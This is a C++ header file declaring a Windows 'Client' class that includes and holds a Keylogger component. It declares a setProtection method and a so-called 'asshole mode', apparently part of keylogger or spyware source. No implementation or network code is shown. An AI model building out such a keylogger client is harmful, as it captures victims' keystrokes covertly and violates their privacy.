
#ifndef _CLIENT_HH_
# define _CLIENT_HH_

#include <iostream>
#include <Windows.h>
#include <WinBase.h>
#include <winternl.h>
#include <ClientWindow.h>
#include <Keylogger.hh>

class				Client
{
public:
	Client();
	~Client();

	bool			init(HINSTANCE instance);
	bool			setProtection();
	void			run();
	void			runAssholeMode();
	bool			isRunning();
	bool			isAsshole();

private:
	ClientWindow	_window;
	Keylogger		_keylogger;
	MSG				_msg;
	bool			_running;
	bool			_assholeMode;
};

#endif _CLIENT_HH_